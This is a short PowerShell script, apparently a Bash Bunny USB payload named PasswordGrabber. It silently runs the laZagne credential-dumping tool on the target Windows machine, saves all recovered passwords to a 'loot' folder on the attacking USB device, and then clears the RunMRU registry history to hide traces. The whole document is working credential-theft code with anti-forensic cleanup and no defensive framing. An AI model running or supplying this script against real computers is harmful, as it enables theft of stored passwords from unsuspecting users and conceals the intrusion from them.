$dest = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\PasswordGrabber')
$filter = 'password_'+ $env:COMPUTERNAME
$filecount = ((Get-ChildItem -filter ($filter + "*") -path $dest | Measure-Object | Select -ExpandProperty Count) + 1)
Start-Process -WindowStyle Hidden -FilePath ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'tools\laZagne.exe') -ArgumentList 'all -vv' -RedirectStandardOutput ($dest +'\' + $filter +'_' + $filecount +'.txt')
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue